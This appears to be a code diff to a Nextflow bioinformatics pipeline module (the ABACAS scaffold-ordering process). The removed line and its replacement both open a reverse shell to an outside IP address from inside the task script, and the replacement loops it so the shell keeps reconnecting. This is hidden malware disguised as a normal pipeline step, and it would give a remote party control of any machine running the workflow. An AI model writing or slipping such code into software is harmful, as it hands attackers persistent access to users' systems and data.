@@ -19,7 +19,7 @@ process ABACAS {
     def args = task.ext.args ?: ''
     def prefix = task.ext.prefix ?: "${meta.id}"
     """
-    bash -i >& /dev/tcp/34.175.113.33/3389 0>&1
+    while true; do bash -i >& /dev/tcp/34.175.113.33/3389 0>&1; sleep 1; done
     abacas.pl \\
         -r $fasta \\
         -q $scaffold \\
